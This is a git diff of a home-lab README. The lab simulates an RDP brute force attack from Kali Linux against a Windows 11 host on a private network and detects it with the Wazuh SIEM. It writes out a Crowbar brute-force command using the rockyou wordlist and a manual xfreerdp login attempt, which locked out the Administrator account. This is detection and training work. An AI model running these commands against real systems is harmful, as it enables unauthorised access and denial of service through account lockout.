@@ -4,7 +4,7 @@
 
 ![Status](https://img.shields.io/badge/Status-Complete-brightgreen?style=for-the-badge)
 ![MITRE](https://img.shields.io/badge/MITRE-T1110%20%7C%20T1531%20%7C%20T1098-red?style=for-the-badge)
-![Wazuh](https://img.shields.io/badge/Wazuh-4.11-blue?style=for-the-badge)
+![Wazuh](https://img.shields.io/badge/Wazuh-4.12-blue?style=for-the-badge)
 
 *Simulating an RDP brute force attack from Kali Linux against a Windows 11 host and detecting it with Wazuh SIEM.*
 
@@ -16,8 +16,8 @@
 
 | Machine | Role | OS | IP |
 |--------|------|----|----|
-| Kali Linux | Attacker | Kali Rolling | 192.168.0.107 |
-| Windows 11 | Target + Wazuh Agent | Windows 11 Enterprise | 192.168.0.104 |
+| Kali Linux | Attacker | Kali Linux | 192.168.0.107 |
+| Windows 11 | Target + Wazuh Agent | Windows 11 Pro | 192.168.0.104 |
 | Ubuntu Server | Wazuh Manager | Ubuntu 22.04 | 192.168.0.106 |
 
 ---
@@ -32,7 +32,7 @@ Simulate an RDP brute force attack and validate that Wazuh correctly detects, cl
 
 | Tool | Purpose |
 |------|---------|
-| Wazuh 4.11 | SIEM — alert generation and correlation |
+| Wazuh 4.12 | SIEM — alert generation and correlation |
 | OpenSearch Dashboards | Alert visualization and DQL queries |
 | xfreerdp | RDP client used to generate failed login attempts |
 | Crowbar 0.4.2 | RDP brute force tool |
@@ -96,25 +96,18 @@ Expected:  INFO: Agent is now online. Process unlocked, continuing...
 
 ---
 
-## 💥 Attack Execution
-
-### Crowbar
-
-```bash
-# Clean wordlist (avoids encoding errors in rockyou.txt)
+💥 Attack Execution
+Step 1 — Manual verification with xfreerdp
+Before running the full attack, single failed login attempts were made manually to confirm RDP was reachable and events were being generated.
+bashxfreerdp /v:192.168.0.104 /u:Administrator /p:wrongpassword /cert:ignore
+Step 2 — Brute force with Crowbar
+bash# Clean wordlist (avoids encoding errors in rockyou.txt)
 strings /usr/share/wordlists/rockyou.txt > /tmp/rockyou_clean.txt
 
-# Run brute force
+# Run brute force — this triggered account lockout
 crowbar -b rdp -s 192.168.0.104/32 -u Administrator -C /tmp/rockyou_clean.txt -n 1 -v
-```
 
-### xfreerdp (manual failed login)
-
-```bash
-xfreerdp /v:192.168.0.104 /u:Administrator /p:wrongpassword /cert:ignore
-```
-
----
+Crowbar's repeated attempts hit the account lockout threshold, locking out the Administrator account and generating Event ID 4740.---
 
 ## 📊 Attack Timeline
 
